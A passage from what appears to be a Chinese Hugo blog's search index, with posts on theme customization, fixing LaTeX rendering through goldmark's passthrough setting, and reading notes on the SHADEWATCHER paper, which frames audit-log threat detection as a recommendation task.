if (articleTile) { // let observer = new IntersectionObserver(async (entries, observer) =\u0026gt; { // entries.forEach(entry =\u0026gt; { // if (!entry.isIntersecting) return; // observer.unobserve(entry.target); // const articles = entry.target.querySelectorAll(\u0026#39;article.has-image\u0026#39;); // articles.forEach(async articles =\u0026gt; { // const image = articles.querySelector(\u0026#39;img\u0026#39;), // imageURL = image.src, // key = image.getAttribute(\u0026#39;data-key\u0026#39;), // hash = image.getAttribute(\u0026#39;data-hash\u0026#39;), // articleDetails: HTMLDivElement = articles.querySelector(\u0026#39;.article-details\u0026#39;); // const colors = await getColor(key, hash, imageURL); // articleDetails.style.background = ` // linear-gradient(0deg, // rgba(${colors.DarkMuted.rgb[0]}, ${colors.DarkMuted.rgb[1]}, ${colors.DarkMuted.rgb[2]}, 0.5) 0%, // rgba(${colors.Vibrant.rgb[0]}, ${colors.Vibrant.rgb[1]}, ${colors.Vibrant.rgb[2]}, 0.75) 100%)`; // }) // }) // }); // observer.observe(articleTile) // } 注释掉\n会从这样\n变成这样\n","date":"2024-09-04T15:43:00+08:00","image":"http://localhost:1313/p/hugostack%E8%A3%85%E4%BF%AE/index/1725472639010_hu13846967387673921839.png","permalink":"http://localhost:1313/p/hugostack%E8%A3%85%E4%BF%AE/","title":"HugoStack装修"},{"content":"导语 最近在用hugo写博客的时候遇到某些公式一直渲染不对的问题，经过一番查证，最终找到了结果，遂把解决过程放在这里供大家参考。\n问题引入 某天，柱桑在写论文笔记的时候，突然发现在他的vscode里Markdown的tex都被渲染了\n而hugo server -D却怎么都不渲染，还出现了斜体\n好不容易学会的latex公式的敲法（虽然这里用了gpt-4o多模态图转公式），结果不显示，这不得气死？？\n出现原因 这个斜体是切入点，Markdown语法中，用\u0026rsquo;_\u0026lsquo;包裹的文字会变成斜体，也就是说这是因为我的公式里的_被Markdown先转成了 \u0026lt;em\u0026gt;标签，然后tex引擎一看，你这$里包的也不是公式啊？于是就没有渲染。\n解决办法 知道了出现原因就好办了，只需要让Markdown引擎不要渲染，留给tex引擎渲染就好。\nhugo stack使用goldmark来渲染作为Markdown的渲染引擎，你可以在你的config里再确认一遍\n1 2 3 4 5 markup: goldmark: renderer: ## Set to true if you have HTML content inside Markdown unsafe: true 同时他还用了KATEX作为tex公式渲染引擎，在 \\layouts\\partials\\article\\components可以再确认一遍\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 {{- partial \u0026#34;helper/external\u0026#34; (dict \u0026#34;Context\u0026#34; . \u0026#34;Namespace\u0026#34; \u0026#34;KaTeX\u0026#34;) -}} \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css\u0026#34; integrity=\u0026#34;sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;script defer src=\u0026#34;https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js\u0026#34; integrity=\u0026#34;sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script defer src=\u0026#34;https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js\u0026#34; integrity=\u0026#34;sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; window.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, () =\u0026gt; { renderMathInElement(document.querySelector(`.article-content`), { delimiters: [ { left: \u0026#34;$$\u0026#34;, right: \u0026#34;$$\u0026#34;, display: true }, { left: \u0026#34;$\u0026#34;, right: \u0026#34;$\u0026#34;, display: false }, { left: \u0026#34;\\\\(\u0026#34;, right: \u0026#34;\\\\)\u0026#34;, display: false }, { left: \u0026#34;\\\\[\u0026#34;, right: \u0026#34;\\\\]\u0026#34;, display: true } ], ignoredClasses: [\u0026#34;gist\u0026#34;] });}) \u0026lt;/script\u0026gt; 这里delimiters就是KATEX的auto-render用来看哪些是他需要渲染的部分，没有任何毛病，只需要让goldmark不去渲染即可。\n经过我的不懈查找，有多个解决办法，首先是我的解决办法：\n使用goldmark的passthrough插件 这也是hugo官方建议的解决办法：https://gohugo.io/content-management/mathematics/\n在config里进行相应的设置，这里是使用了goldmark的passthrough拓展，把用 \\[ \\] 和 $$括起来的块和行内用 \\(\\)和 $括起来的部分不解析\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 markup: goldmark: renderer: ## Set to true if you have HTML content inside Markdown unsafe: true extensions: passthrough: delimiters: block: - - \\[ - \\] - - $$ - $$ inline: - - \\( - \\) - - $ - $ enable: true it suits me fine.\n用goldmark-katex或goldmark-mathjax 我没试这个，但是我觉得他应该是没问题的\nhttps://github.com/litao91/goldmark-mathjax\nhttps://github.com/FurqanSoftware/goldmark-katex\n","date":"2024-09-03T17:39:50+08:00","image":"http://localhost:1313/p/markdown%E4%B8%8B%E7%9A%84tex%E6%B8%B2%E6%9F%93%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3/index/1725357281808_hu6612691657742813394.png","permalink":"http://localhost:1313/p/markdown%E4%B8%8B%E7%9A%84tex%E6%B8%B2%E6%9F%93%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3/","title":"Markdown下的Tex渲染失败解决"},{"content":"导语 sp22\ndoi is here\nAbstract 系统审计通过监控系统实体之间的交互，提供了对网络威胁的低层次视角。针对高级网络攻击，一种普遍的解决方案是对审计记录进行数据溯源分析，以寻找异常（异常行为）或已知攻击的特征。然而，现有的方法存在几个局限性：1) 产生大量误报，2) 依赖专家知识，或 3) 生成粗粒度的检测信号。在本文中，我们认识到网络安全中的威胁检测与信息检索中的推荐之间的结构相似性。通过将系统实体交互的安全概念映射到用户-物品交互的推荐概念，我们通过预测系统实体对其交互实体的偏好来识别网络威胁。此外，受近期在推荐中通过物品侧信息建模高阶连通性的进展启发，我们将这一思路转移到网络威胁分析中，并定制了一个自动检测系统 SHADEWATCHER。该系统通过图神经网络实现审计记录中的高阶信息潜力，以提高检测效果。此外，我们为 SHADEWATCHER 配备了动态更新功能，以更好地应对误报。在对真实和模拟网络攻击场景的评估中，SHADEWATCHER 在高精度和高召回率的威胁识别方面展现了优势。此外，SHADEWATCHER 能够在几秒钟内从近百万个系统实体交互中精确定位威胁。\nIntroduction 现有的基于来源的检测器分为三类：1） 基于统计的检测通过审计记录在溯源图中的稀有性来量化审计记录的可疑程度 [10]–[12];2） 基于规范的检测将审计记录与与已知攻击模式相关的安全策略知识库进行匹配 [13]–[19];3） 基于学习的检测扩展了机器学习技术，以对良性行为进行建模并检测与良性行为的偏差\n基于统计的检测容易出现大量误报，适用于罕见但正常的系统活动。这是因为统计分析只考虑来源图中的直接（因果）联系，而不考虑系统实体之间的微妙（语义）关系，这对于威胁分析至关重要，尤其是在面对不断变化的行为时。虽然基于规范的检测可以通过将攻击语义定义为安全策略来保持较低的误报率，但这种启发式方法非常耗时且容易出错。基于学习的检测旨在将审计记录的因果关系和语义全面纳入威胁分析。尽管检测精度很高，但目前的学习方法产生的检测信号是粗粒度的，例如行为水平。因此，需要繁琐的体力劳动来审查个人行为中的所有审计记录，以确定它们是否表明实际的攻击\n分析网络威胁的根本挑战是在大量审计记录中进行全面而细粒度的推理。安全分析师不仅需要辨别某个审计记录是否是攻击的结果，还需要辨别它与恶意行为的关联。威胁行为者通常会通过分析师认为可疑的意外系统实体交互来诱导不需要的行为。直观地说，有意的交互构成了行为的规范，并构成了最 “可能” 被观察到的行为。相反，无意的行为偏离了常态，并包含了“不太可能”需要观察的互动。因此，可以通过确定系统实体与另一个实体交互的可能性来揭示网络威胁。这种交互的可能性可以通过利用出处图中的因果联系来估计。然而，这种连接性并没有捕捉到系统实体背后隐藏的语义含义，而这些语义是揭示它们之间的关系所必需的。为了说明这一点，请考虑 Linux /proc 文件系统。由于 /proc/25/stat 和 /proc/27/stat 属于不同的进程，因此它们在出处图中通常是断开连接的，被直接连接视为因果无关。但是，它们都显示有关进程的状态信息，在考虑它们周围的边界上下文时，可以反映这些信息。【这个例子的意思是他要搞一个新的建图方法？】\n我们注意到，在推荐域中也探讨了类似的问题，其中主要目标是预测用户消费商品的可能性。早期的推荐系统假设行为相似的用户会共享对项目的偏好，以便他们通过历史用户项目交互找到相似的用户来理解用户偏好。但是，用户和项目之间的直接连接（称为一阶连接）不足以比较不同项目之间的语义相似性。为了解决这个问题，研究人员进一步考虑了项目的侧面信息，例如，电影的类型，以捕获项目语义。其核心是侧面信息可以形成高阶连接，以链接用户-项目交互中断开连接的相似项目。基于建议的这一进步，我们的目标是整合系统实体的侧面信息，以全面解释它们的交互。尽管这些辅助信息没有在出处图中明确编码，但最近的一项研究表明，系统实体的语义可以从使用它们的上下文中揭示出来。因此，我们利用上下文信息作为底层 Side 信息来分析系统实体。此后，具有相似上下文的系统实体将在语义上相关，尽管在因果分析中被认为无关紧要。【还是用上下文信息呗】\n通过将系统实体交互和实体上下文信息的网络安全概念映射到用户-项目交互和项目端信息的推荐概念，我们可以将网络威胁检测制定为推荐任务。特别是，我们观察到语义相似的系统实体会在交互上表现出相似的偏好。例如，敏感文件（例如 /etc/passwd 和 /etc/shadow）通常不与公共网络交互，否则表明数据泄露 [32]。基于此观察结果，可以进一步将威胁检测指定为预测系统实体不“首选”其交互式实体的可能性。请注意，与研究用户偏好的典型推荐方案相比，威胁检测针对系统实体不太可能喜欢的交互，因为此类交互通常是强攻击指标。\n在本文中，我们介绍了 SHADEWATCHER，这是第一个通过系统实体交互建议来分析网络威胁的系统。SHADEWATCHER 使用上下文感知嵌入模型提取系统实体的侧面信息，该模型通过实体在运行系统中的使用情况来展开实体的语义。为了揭示交互的系统实体意图，SHADEWATCHER 采用了基于图神经网络构建的推荐模型，该模型通过递归传播来自相邻实体的信息来利用高阶连接。此外，SHADEWATCHER 还根据分析师对检测信号（即潜在的恶意交互）的反馈动态更新其模型。这允许 SHADEWATCHER 集成虚假建议作为额外的监督，以提高其检测能力。作为一种半监督方法，SHADEWATCHER 在未标记的良性系统实体交互与标记的分析师对误报的反馈相结合的基础上进行了训练。简而言之，SHADEWATCHER 对建议的新颖利用使其对现有检测器有利，因为：1） SHADEWATCHER 不是将历史频率作为估计怀疑程度的指标，而是推断系统实体的内在语义以发现异常交互;2） SHADEWATCHER 提供端到端解决方案，无需事先了解攻击即可检测威胁;3） SHADEWATCHER 生成精细的检测信号，突出显示攻击的关键指标。\n我们实施了 SHADEWATCHER，并评估了其对 TRACE 团队在 DARPA 透明计算 （TC） 计划中生成的四次 APT 攻击的有效性和效率，以及最近文献中在测试台环境中模拟的六次网络攻击。实验结果表明，SHADEWATCHER 可以有效区分良性和恶意的系统实体交互，并以较高的精度和召回率检测网络威胁。我们还证明了 SHADEWATCHER 足够高效，可以扩展到企业环境。\n总之，我们做出了以下贡献：\n我们识别出威胁检测和推荐之间的任务相似性。建立这两个领域之间的映射是我们方法的关键创新，这为网络威胁分析提供了有效解决方案的新空间。此外，我们认识到在审计记录中高阶信息的概念，用于建模系统实体对其交互实体的偏好。 提出了 SHADEWATCHER，这是第一个基于推荐原理设计的系统，旨在以自动化和自适应的方式分析网络威胁，同时提供适当的抽象以突出关键攻击指标。 我们实现了 SHADEWATCHER，并针对真实和模拟攻击场景进行了系统评估。结果表明，SHADEWATCHER 在网络威胁分析中实现了高效能和高效率。 Background\u0026amp;Motivation 攻击场景 带有 drakon dropper 的浏览器扩展（简称 Extension Backdoor）是来自 DARPA TC 计划红队对蓝队对抗战的 APT 攻击 [35]。攻击始于在访问恶意网站时破坏 Firefox 中易受攻击的密码管理器扩展通行证 mgr。然后，被入侵的扩展程序会在磁盘上放置一个恶意程序 gtcache。在执行过程中，程序会将用户信息 /etc/passwd 泄露到公共网络。同时，它植入 ztmp 来收集系统配置并执行目标网络的端口扫描以进行内部侦察。\n图 1a 显示了根据 Extension Backdoor 中的审计记录构建的简化出处图。图中的节点表示系统实体，其中矩形、椭圆和菱形分别表示进程、文件和套接字。灰色边缘表示以信息流方向为导向的系统调用。为了减少混乱，我们使用两个单独的节点来代替具有不同进程 ID 的 /proc/pid/stat 和具有不同网络端口的 128.55.12.73。Provenance 图为导航大规模审计记录提供了一种有前途的表示形式。它使安全分析师能够执行向后和向前信息流跟踪，以发现安全事件的根本原因及其后果\n对现有方法的挑战 基于来源的检测擅长从来源图中提取潜在的恶意行为。然而，我们确定了现有方法的几个固有局限性。\n基于统计的检测：最近的研究观察到，攻击活动中的安全事件通常是不常见的系统活动。因此，他们通过历史频率量化审计记录的可疑程度。虽然简单有效，但主要问题是使用统计分析生成的误报数量。例如，当 gtcache 首次读取图 1a 中的 /proc/27/stat 时，会发出警报，因为此活动以前从未见过，尽管它表示完全正常的进程状态检索。从这个例子中，很容易看出基于统计的方法的主要不足，即识别系统执行历史上很少见的审计记录，但无法区分正常记录与以前未观察到但语义相关的活动。 基于规范的检测：基于规范的检测器通过将审计记录与描述攻击语义的安全策略知识库进行匹配来追踪网络威胁。虽然这种检测可以保持较低的误报率，但制定安全策略非常耗时，并且不可避免地需要领域专业知识。关于我们的激励性示例，RapSheet开发了十多个手工制作的 TTP（战术、技术和程序）查询，用于杀伤链搜索;Morse初始化 600 万个系统实体的机密性和完整性标签，用于标签传播;Poirot从一份六页的网络威胁情报报告中提取查询图，用于图形对齐。我们还注意到，由于专家对攻击的主观解释、能力水平不同，甚至只是纯粹的人为错误等因素，最终策略的质量可能会有很大差异。 基于学习的检测：目前基于学习的检测器大多训练良性行为模型，并将偏差检测为网络攻击。虽然这些方法可以通过将审计记录的语义纳入威胁分析来实现高检测准确性，但迄今为止还没有学习解决方案提供有关攻击关键指标的可解释结果或见解，从而削弱了在实践中的实用性。具体来说，需要大量的手动工作来查看行为中的审计记录，以找到触发检测信号的特定系统活动。例如，由于 Unicorn 分析了长时间系统执行的 APT 攻击，分析师需要筛选数千条审计记录，以识别和验证单个检测信号的指标。 威胁检测作为建议 系统实体交互是我们方法的基石，我们利用观察结果，即低可能性的交互可以自然地被识别为潜在的网络威胁。例如，浏览器下载的可执行文件（例如 gtcache）通常不会运行敏感的用户命令（例如 uname），否则意味着恶意执行 。基于来源的解决方案通常使用来源图中的因果关系来解释系统实体交互。然而，这种因果关系不足以揭示两个系统实体之间的语义关系。特别是，因果断开的实体（例如， /proc/pid/stat 具有不同的 pid ）不一定在语义上无关紧要。\n我们发现，在推荐域中也探讨了类似的问题。图 1b 说明了一个电影推荐场景，其中 Alice 是为其提供推荐的目标用户。用户-项目交互 Alice→Iron Man 和 Bob →Iron Man） 表明 Alice 和 Bob 之间的行为相似性。基于行为相似的用户对项目有共同偏好的假设，早期的推荐系统预测 Alice 会像 Bob 喜欢的那样支持 Thor。但是，考虑到相关项目对特定用户的推荐，用户与项目的交互是不够的，因为它们无法比较项目语义相似性。为了解决这个问题，最近提出的方法利用项目方面的信息，如电影类型和工作室，形成高阶连接，将语义相似的项目联系起来。例如，钢铁侠→Action→复仇者联盟和钢铁侠→漫威影业→复仇者联盟“这两个顺序连接表明爱丽丝可能更喜欢复仇者联盟，因为它的侧面信息与钢铁侠的信息相同。\n同样，更好地了解系统实体交互的一种直观方法是识别系统实体的侧面信息以形成高阶连接。例如，如果 /proc/27/stat 通过侧面信息（例如，图 1c 中的进程状态信息）与 /proc/25/stat 相关联，我们将确定它们共享与其他系统实体（例如 gtcache）交互的概率。但是，side information 未在原始 Provenance Graph 中显式编码。为了提取这些知识，我们从最近的一项研究中汲取灵感，该研究从系统实体的使用上下文中推断出系统实体的语义。更具体地说，我们将上下文信息视为剖分析系统实体的辅助知识。因此，系统实体的因果关系形成用户-项交互，如建议中所示，而系统上下文提供侧面信息以形成高阶连接。请注意，由于系统实体的上下文信息反映在来源图中的邻居中，因此我们将高阶连接捕获为关联相邻实体的多跳路径。\n因此，我们可以将网络威胁检测表述为推荐问题，它对两个系统实体之间交互的可能性进行建模，预测实体通常不喜欢作为网络威胁的交互。例如，在图 1a 中检测到 Extension Backdoor 的攻击会变成推荐 gtcache 不太可能与之交互的系统实体在图 1c 中。在这种洞察力的推动下，我们能够在威胁检测和推荐领域之间架起桥梁，并利用推荐方法的进步来帮助理解系统实体交互。\nProblem definition 基本概念 Provenance Graph：审计记录是一组描述系统执行历史记录的日志条目。每条记录都以系统调用的粒度表示一个活动。通常，它被表述为 3 元组 $(src， rel， dst)$，其中 $src， dst ∈ E = {process， f ile， socket}，rel ∈ R = {clone， write， ...} $。例如，图 1a 中的网络服务扫描活动定义为 $（ztmp， connect， 128.55.12.73：54）$。数据来源以来源图的形式组织审计记录，来源图是由$ （src， rel， dst）$ 元组组成的有向无环图。正式地，我们将出处图定义为$ GP = {（src， rel， dst）| src， dst ∈ E， rel ∈ R}。$\n系统实体交互：来源图中的因果关系反映了系统实体之间的交互。例如，图 1a 中连接 gtcache 和 uname 的边链表明它们是交互式的。在推荐场景中，用户-项目交互通常以二分图的形式呈现，以保留协同过滤信号 [38]。因此，我们还将系统实体交互定义为二分图，$GB = {（e， y_{ee}^′ ， e^′）|e， e^′ ∈ E）}$。链接$ y_{ee}^′ = 1$ 表示实体 e 与实体$ e^′$ 进行了交互，而 $y_{ee}^′ = 0$ 则相反。请注意，系统实体交互不仅表示显式数据依赖关系，还表示隐式控制依赖关系。例如，前面提到的 gtcache 和 uname 之间的交互显示了一个控制依赖关系，其中 gtcache 操作 ztmp 来执行 uname。\n连接顺序：在这里，我们定义了知识图谱 （KG） 的概念，它将系统实体上下文和交互编码为统一的关系图。更具体地说，我们将 GB 中的有效交互（即 $y_{ee}^′ = 1$）转换为 3 元组$（e， interact， e^′）$，其中 interact 代表系统调用之外的附加关系。由于 GP 和 GB 现在都被定义为实体-关系-实体集，我们可以将它们统一为 KG，$GK = {（h， r， t）|h， t ∈ E， r ∈ R^′}$，其中 R′ = R ∪ {interact}。通过代表系统实体上下文和交互的 KG，我们将一阶连接性正式定义为 KG 中的单跳连接（例如，/etc/passwd −r1 →gtcache），将高阶连接性定义为多跳路径（例如，/etc/passwd −r1 →gtcache−r4 →146.153.68.151：80）。\n问题陈述 给定审计记录中的系统实体交互，我们的目标是学习一个推荐模型，其目标是预测系统实体 h 不与另一个实体 t 交互的概率 yˆht。请注意，yˆht 还表示交互是对抗性的可能性，这构成了 SHADEWATCHER 分析审计记录中的网络威胁的基础。 威胁模型：这项工作考虑了旨在操纵或泄露系统中存在的信息的攻击者。例如，攻击者可能会安装恶意软件或插入后门来窃取敏感数据。与之前关于系统审计的研究类似，我们假设操作系统和内核空间审计框架是我们值得信赖的计算基础。此外，我们不考虑在系统审核中不可见的硬件木马或侧信道攻击。\n请注意，在 APT 生命周期期间，攻击者可能会升级权限以破坏系统审计，此时审计数据对于网络威胁分析不再可靠。但是，我们可以通过采用安全的来源存储系统或在远程分析服务器中管理审计数据来确保历史审计记录的完整性。因此，攻击者无法操纵以前的审计记录，这些记录跟踪了 SHADEWATCHER 的权限提升证据，以检测恶意系统实体交互。通过进一步整合防篡改审计技术，我们可以定位攻击者何时篡改审计记录以隐藏他们的足迹。最后，可以采用系统强化技术（例如 Linux IMA）来增加损害系统审计的复杂性。\nSHADEWATCHER OVERVIEW 图2展示了SHADEWATCHER架构的概述，该架构接收由通用审计框架（即Linux Audit）收集的审计记录，并生成针对对抗性系统实体交互的信号。SHADEWATCHER由四个主要阶段组成：构建知识图谱（KG）、生成推荐模型、检测网络威胁以及适应模型。\n我们的知识图谱构建器首先将系统审计记录转换为来源图（PG），并将系统实体交互提取为二分图（BG）。然后，将PG和BG结合成一个知识图谱（KG），该知识图谱随后用于学习一个推荐模型，其目标是预测系统实体对其交互实体的偏好。\n我们推荐系统的关键思想是利用知识图谱中的不同阶连通性来建模系统实体交互的可能性，将系统执行中的异常识别为网络威胁。详细内容将在§ VI中给出，但我们在此概述工作流程。为了明确利用一阶和高阶信息，我们通过上下文感知嵌入模块将系统实体参数化为嵌入（即向量），然后通过图神经网络从邻居处迭代传播嵌入。通过聚合所有传播迭代中的嵌入，SHADEWATCHER确定实体间交互为对抗性的概率。\n当系统行为发生变化时，SHADEWATCHER可能会对未观察到但无害的系统实体交互产生误报。为了跟上不断演变的交互模式，SHADEWATCHER提供了一种选项，可以通过适应分析师对误报交互的反馈动态更新其推荐模型。\n总之，SHADEWATCHER的功能可以分为两个阶段，即训练和检测。为了进行基于异常的检测，我们使用无攻击的审计记录来训练推荐模型。对于新到来的审计流，SHADEWATCHER首先提取系统实体交互，并将其输入到训练阶段获得的推荐模型中。然后，如果这些交互被判断为敌对的概率大于预定义的阈值，SHADEWATCHER将其检测为潜在威胁。需要注意的是，SHADEWATCHER目前被设计和实现为进行离线网络威胁分析。我们在附录A中讨论将SHADEWATCHER适应在线方法的潜力及相应的挑战。\nKNOWLEDGE GRAPH BUILDER 在本节中，我们将介绍如何将审计记录解析为知识图谱 （KG），该知识图谱在审计记录中保留一阶和高阶信息。\nProvenance Graph Construction 考虑到终端主机上的审计记录，SHADEWATCHER将其转换为一种称为来源图（Provenance Graph, PG）的图结构。图中的节点表示具有一组属性的系统实体，边则描述系统实体之间的因果依赖关系以及记录发生的时间戳。作为审计记录的一种常见表示方式，PG便于对长期攻击进行推理，因为因果记录之间密切相关，尽管在时间上可能相距较远。\n需要注意的是，大多数审计记录在网络威胁的因果分析中并不是严格必要的。更糟糕的是，敌对活动可能会在正常和复杂审计记录的噪声中被淹没。因此，我们借鉴了最近的研究，实施了几种噪声减少策略（在附录B中解释），以减少审计复杂性，同时保留与攻击相关的信息。\nInteraction Extraction SHADEWATCHER基于系统实体交互识别网络威胁。一种简单的方法是将PG中的每两个系统实体配对，探索它们之间的因果依赖关系。特别地，一对因果连接的实体代表一个有效的交互。不幸的是，由于大多数PG的规模庞大，在实践中遍历所有系统实体对是不可行的。例如，基于DARPA TRACE数据集构建的PG包含超过六百万个系统实体，形成了18万亿对。然而，只有极小一部分（远低于0.01%）的系统实体对表现出有效的交互。\n研究表明，从审计记录中抽象行为可以有效减少分析工作量。具体而言，每个行为被表示为一个来源子图，包含一系列以数据对象（如文件）为根的因果记录。图1a展示了与扩展后门（Extension Backdoor）相关行为的一个例子。用双圈突出显示的gtcache表示根数据对象。在行为层面上进行工作可以大幅减少交互分析的范围，因为因果不连接的系统实体已被划分到不同的行为中。因此，我们决定在提取系统实体交互之前，将PG划分为多个子图，每个子图描述一个行为。为此，我们首先识别PG中的所有数据对象，然后对每个数据对象执行前向深度优先搜索以提取子图，最后如果一个子图是另一个的子集，则合并这两个子图。\n直观上，行为总结了一系列数据对象与其交互实体之间的交互，这些实体分别表示交互的发起者和目标。例如，给定交互gtcache→uname和gtcache→162.66.239.75:53，我们观察到一个可执行文件试图收集系统配置并扫描网络服务。基于这一直觉，SHADEWATCHER将行为中的交互转换为一个二分图（BG），其中两个不相交的节点集分别是数据对象和系统实体，连接这两个集的边反映了交互。\n结合来源图和二分图。将系统实体交互视为超越系统调用的关系，PG和BG都被形式化为实体-关系-实体元组的集合。因此，我们对齐系统实体，将其合并为一个知识图（KG），如§ III-A中定义。SHADEWATCHER提供将KG存储到数据库（PostgreSQL或Elasticsearch）中的能力，使得KG可以被查询，而无需为后续的网络威胁分析从头构建。我们还将Kibana集成到SHADEWATCHER中，作为可视化前端，以便于攻击调查。\nRECOMMENDATION MODEL 图 3 说明了 SHADEWATCHER 推荐模型的工作流程。它主要包括三个部分：1） 对一阶信息进行建模，通过其使用上下文将系统实体参数化为嵌入（即矢量化表示）;2） 对高阶信息进行建模，通过递归传播来自多跳相邻实体的信息来更新系统实体表示;3） 学习检测威胁，预测交互在两个系统实体表示之上对抗的可能性。\n对一阶信息进行建模 结合了系统实体交互和实体上下文的安全概念以及用户-项目交互和项目属性的推荐概念，我们意识到知识图（KG）中的直接连接展示了系统实体之间的行为和语义相似性。为了建模这种一阶连接性，我们使用KG嵌入方法将系统实体参数化为向量，其中两个向量化实体之间的距离捕捉了它们的相似性。TransE是一种广泛使用的方法。其核心是翻译原则：如果一个元组$(h, r, t)$在KG中成立，则系统实体h、t及其关系r的嵌入通过满足$e_h + e_r ≈ e_t$来学习，其中$e_h, e_r, e_t ∈ \\mathbb R^d$。这个原则与我们对系统实体的直观理解完美契合。以图1a中的(ztmp, connect, 128.55.12.73:53)和(ztmp, connect, 128.55.12.73:54)为例。这两个网络套接字都表示为$e_{ztmp} + e_{connect}$，因此在向量空间中嵌入得很近，表明它们具有相似的语义，这反映了我们将它们标记为网络扫描目标的领域知识。尽管TransE有效，但其存在一个显著的限制——单一的关系类型可能对应多个实体，导致1对N、N对1或N对N的问题。我们在§ VIII-C中展示了这一限制如何影响网络威胁分析。\n为了解决这个问题，我们采用TransR，它为不同关系条件下的系统实体学习单独的表示。它允许我们在不同关系上下文中为同一实体赋予独特的语义。更正式地说，TransR将系统实体h、t和关系r映射到嵌入$e_h, e_t ∈ \\mathbb R^d$，$e_r ∈ \\mathbb R^k$。对于每个关系r，它指定一个投影矩阵$W_r ∈ \\mathbb R^{d×k}$，以将系统实体从d维实体空间转换为k维关系空间，即$e^r_h = e_hW_r, e_t^r = e_tW_r$。之后，TransR通过以下方式衡量给定元组(h, r, t)的可信度分数：\n$$ f(h, r, t) = \\| e_h^r + e_r - e_t^r \\| $$其中 ‖·‖ 表示 L1 范数距离函数。较低的 f(h, r, t) 分数表明该元组在知识图（KG）中更有可能被观察到，反之则不然。为了优化 TransR 的表示学习，我们采用基于边际的成对排名损失，这要求有效元组（在 KG 中观察到）的可信度分数低于损坏元组（未观察到）的可信度分数：\n$$ L_{\\text{first}} = \\sum_{(h,r,t) \\in \\mathcal{G}_K} \\sum_{(h',r',t') \\notin \\mathcal{G}_K} \\sigma(f(h, r, t) - f(h', r', t') + \\gamma), $$对高阶信息进行建模 除了直接的（第一跳）连接外，多跳路径在知识图（KG）中是固有的。这种高阶连接不仅补充了系统实体之间的相似性，还展示了系统实体如何相互影响。例如，二跳路径 /proc/25/stat−r0 → gtcache−r0 → /proc/27/stat 显示了 /proc/25(27)/stat 之间的相似性，因为它们都与 gtcache 进行交互；而 /etc/passwd −r1 → gtcache−r4 → 146.153.68.151:80 描述了敏感用户信息是如何从企业中传输出去的。显然，建模高阶连接可以帮助我们通过揭示系统实体关系来定位潜在对手。然而，仅使用 TransR 无法表征这种高阶信息。\n为了捕获高阶连接性，我们采用图神经网络 （GNN）将多跳路径集成到系统实体表示中。具体来说，给定一个系统实体 h，一个 GNN 模块通过传播和聚合来自邻居的消息来递归更新其表示形式：\n$$ z_h^{(l)} = g(z_h^{(l-1)}, Z_{N_h}^{(l-1)}), $$其中 $z^{(l)}_h \\in \\mathbb{R}^{d_l}$ 是在第 $l$ 层传播中$h$的$d_l$维表示，$z^{(l-1)}_h \\in \\mathbb{R}^{d_{l-1}} $是上一层的表示，且 $ z^{(0)}_h = e_r^h $是通过 TransR 导出的嵌入进行初始化的；$N_h$ 是 $h$的一跳邻居（也称为自网络 [56]），而 $z^{(l-1)}_{N_h} \\in \\mathbb{R}^{d_{l-1}}$记忆了从 \\( h \\) 的 \\( (l-1) \\) 跳邻居传播来的信息；$g(\\cdot) $ 是聚合函数，用于将实体的表示与其邻居传播来的信息相结合。可以看出，信息传播和聚合函数在 GNN 模块中都起着至关重要的作用。\n在信息传播方面，由于不同的相邻实体对自我实体 h 的贡献是不平等的，我们设计了一种注意力机制 [29] 来区分系统实体邻居的重要性：【和GAT有啥区别呢】\n$$ z_{N_h}^{(l-1)} = \\sum_{(h, r, t) \\in N_h} \\alpha(h, r, t) z_t^{(l-1)}, $$其中 α(h,r,t) 是注意力函数，用于控制在特定关系 r的条件下，从 t 到 h 传播多少信息。我们将其设计如下：\n$$ \\alpha(h, r, t) = e_t^{r \\top} \\tanh(e_h^{r} + e_r), $$其中 $e^{r}_{t}$ 、$e^r_h$ 和 $e_r$ 是从 TransR 获得的系统实体嵌入。所有邻接实体的注意力分数通过 softmax 函数进一步归一化。通过这种注意力信息传播，我们能够从相关实体中突出有用信号，并过滤掉不相关实体中的无用信号。\n$$ g(z^{(l-1)}_h, z^{(l-1)}_{N_h}) = \\text{LeakyReLU}((z^{(l-1)}_h \\| z^{(l-1)}_{N_h}) W^{(l)}), $$其中 $\\cdot\\|\\cdot$ 是两个向量之间的拼接运算符；$ W^{(l)} \\in \\mathbb{R}^{2d^{(l-1)} \\times d^{(l)}} $ 是第 l 层传播层的变换矩阵，用于提取有用信息。因此，我们可以将多跳邻居的消息整合到实体的原始表示 $z^{(0)}_h$ 中，从而形成新的表示 $z^{(l)}_h$ 。具体来说，整合邻近实体的跳数由传播层数 L 决定。\n学习检测威胁 在获得系统实体的表示后，我们进入威胁检测——学习将系统实体的交互分类为正常和对抗性。在进行 L 次信息传播和聚合后，我们获得了实体 h 的一系列表示 $\\{z_h^{(0)},\\dots,z_h^{(L)} \\}$，这些表示编码了知识图谱中的不同阶次信息。在这里，我们使用一个简单的拼接运算符将它们合并为最终表示：\n$$ z_h^* = z^{(0)} \\| \\cdots \\| z^{(L)}_h. $$串联没有引入额外的参数来优化和保留与不同传播层相关的信息，这在最近的推荐系统中取得了可喜的性能\n对于任何交互(h,interact,t)，我们对系统实体表示应用内积，以预测系统实体 h 不与另一个实体 t 进行交互的可能性:\n$$ \\hat{y}_{ht} = z_h^*{}^ \\top z_t^*. $$如果概率$\\hat y_{ht}$ 